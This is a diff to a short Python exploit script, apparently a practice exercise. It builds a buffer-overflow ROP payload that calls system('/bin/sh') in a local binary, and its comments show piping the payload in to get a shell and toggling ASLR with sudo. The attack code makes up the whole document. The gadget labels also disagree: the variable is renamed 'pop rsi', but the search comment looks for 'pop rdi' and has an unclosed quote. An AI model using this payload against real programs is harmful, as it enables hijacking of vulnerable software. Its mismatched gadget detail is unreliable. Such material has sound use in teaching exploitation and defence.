@@ -35,17 +35,19 @@ buffer = 128 * b"a"  # 0x61
 backup_base_pointer = 8 * b"b"
 backup_instruction_pointer = system_call
 
-rop = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
+rop_pop_rsi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
 
-payload = (
-    buffer
-    + backup_base_pointer
-    + rop
-    + bin_sh_string
-    + system_call
-    + exit_call
-    + bin_sh_string
-)
+payload = buffer + backup_base_pointer + rop_pop_rsi_ret + bin_sh_string + system_call + exit_call
 
 f = open("payload", "wb")
 f.write(payload)
+
+# ropper --search 'pop rdi; ret;
+# cat payload - | ./bin
+# pwd
+# whoami
+# ps -p $$
+
+# now for aslr.
+# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+# cat /proc/sys/kernel/randomize_va_space
